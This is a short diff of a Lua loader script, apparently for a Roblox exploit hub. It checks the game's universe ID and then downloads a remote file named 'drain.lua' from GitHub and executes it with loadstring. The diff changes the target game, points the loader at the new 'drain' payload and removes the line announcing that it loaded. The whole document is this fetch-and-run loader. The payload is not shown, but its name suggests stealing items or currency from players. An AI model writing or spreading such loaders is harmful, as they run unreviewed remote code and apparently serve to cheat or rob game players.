@@ -1,10 +1,13 @@
+local TARGET_UNIVERSE_ID = 10267363348
+local SCRIPT_URL = "https://raw.githubusercontent.com/NovaHubRBLX/NovaHub/refs/heads/main/drain.lua"
 
-local uni = 138381251771774 
-if game.GameId == uni then
+if game.GameId == TARGET_UNIVERSE_ID then
+   
+    
     local success, result = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/NovaHubRBLX/NovaHub/refs/heads/main/uni.lua"))()
+        return loadstring(game:HttpGet(SCRIPT_URL))()
     end)
-    print("loaded")
+  
 else
-    print("This script is not intended for this game universe.")
+    print("Game ID did not match. Script aborted.")
 end
